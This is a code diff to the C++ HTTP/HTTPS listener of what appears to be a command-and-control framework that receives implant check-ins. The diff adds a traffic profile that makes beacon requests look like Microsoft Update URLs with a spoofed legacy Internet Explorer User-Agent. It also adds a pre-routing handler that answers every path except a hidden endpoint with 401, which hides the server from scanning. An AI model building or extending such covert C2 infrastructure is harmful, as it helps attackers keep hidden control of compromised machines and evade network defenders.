@@ -1,21 +1,33 @@
 #include "ListenerHttp.hpp"
 
-#include "Config.hpp"
-
 
 using namespace std;
 using namespace httplib;
 
 
-const httplib::Headers httpServerHeaders = {
-  { "Accept-Encoding", "gzip, deflate" },
-  { "User-Agent", "http server agent" }
-};
+const std::string HttpsEndPoint = "/HttpsEndPoint";
+const std::string HttpEndPoint = "/HttpEndPoint";
 
 
-const httplib::Headers httpsServerHeaders = {
-  { "Accept-Encoding", "gzip, deflate" },
-  { "User-Agent", "https server agent" }
+json httpGet = {
+	{"http-get", {
+		{"uri", {"/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"}},
+		{"client", {
+			{"header", {"User-Agent: Mozilla/4.0 (Compatible; MSIE 6.0;Windows NT 5.1)", "Content-Type: application/octet-stream", "Accept-Encoding: gzip, deflate"}}
+		}},
+		{"server", {
+			{"header", {"User-Agent: Mozilla/4.0 (Compatible; MSIE 6.0;Windows NT 5.1)", "Content-Type: application/octet-stream", "Accept-Encoding: gzip, deflate"}}
+		}}
+  	}},
+	{"http-post", {
+		{"uri", {"/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"}},
+		{"client", {
+			{"header", {"User-Agent: Mozilla/4.0 (Compatible; MSIE 6.0;Windows NT 5.1)", "Content-Type: application/octet-stream", "Accept-Encoding: gzip, deflate"}}
+		}},
+		{"server", {
+			{"header", {"User-Agent: Mozilla/4.0 (Compatible; MSIE 6.0;Windows NT 5.1)", "Content-Type: application/octet-stream", "Accept-Encoding: gzip, deflate"}}
+		}}
+  	}}
 };
 
 
@@ -47,17 +59,57 @@ void ListenerHttp::lauchHttpServ()
 
 	if(m_isHttps)
 	{
-		m_svr->Post(HttpsEndPoint, [&](const httplib::Request& req, httplib::Response& res)
+		m_svr->set_pre_routing_handler([&](const auto& req, auto& res) 
 		{
-			this->HandleCheckIn(req, res);
+
+			std::cout << req.path << std::endl;
+			if (req.path != HttpsEndPoint) 
+			{
+				res.status = 401;
+				return Server::HandlerResponse::Handled;
+			}
+			else
+			{
+				try 
+				{
+					this->HandleCheckIn(req, res);
+				} 
+				catch (...) 
+				{
+					res.status = 401;
+					// res.set_content("toto", "text/html");
+					return Server::HandlerResponse::Handled;
+				}
+			}
 		});
+
 	}
 	else
 	{
-		m_svr->Post(HttpEndPoint, [&](const httplib::Request& req, httplib::Response& res)
+		m_svr->set_pre_routing_handler([&](const auto& req, auto& res) 
 		{
-			this->HandleCheckIn(req, res);
+			std::cout << req.path << std::endl;
+
+			if (req.path != HttpEndPoint) 
+			{
+				res.status = 401;
+				return Server::HandlerResponse::Handled;
+			}
+			else
+			{
+				try 
+				{
+					this->HandleCheckIn(req, res);
+				} 
+				catch (...) 
+				{
+					res.status = 401;
+					// res.set_content("toto", "text/html");
+					return Server::HandlerResponse::Handled;
+				}
+			}
 		});
+
 	}
 
 	m_svr->listen(m_host.c_str(), m_port);
@@ -75,9 +127,23 @@ int ListenerHttp::HandleCheckIn(const httplib::Request& req, httplib::Response& 
 	bool ret = handleMessages(input, output);
 
 	if(m_isHttps)
+	{
+		httplib::Headers httpsServerHeaders = {
+			{ "Accept-Encoding", "gzip, deflate" },
+			{ "User-Agent", "https server agent" }
+			};
+
 		res.headers = httpsServerHeaders;
+	}
 	else
+	{
+		httplib::Headers httpServerHeaders = {
+		{ "Accept-Encoding", "gzip, deflate" },
+		{ "User-Agent", "http server agent" }
+		};
+
 		res.headers = httpServerHeaders;
+	}
 
 	DEBUG("output.size " << std::to_string(output.size()));
 
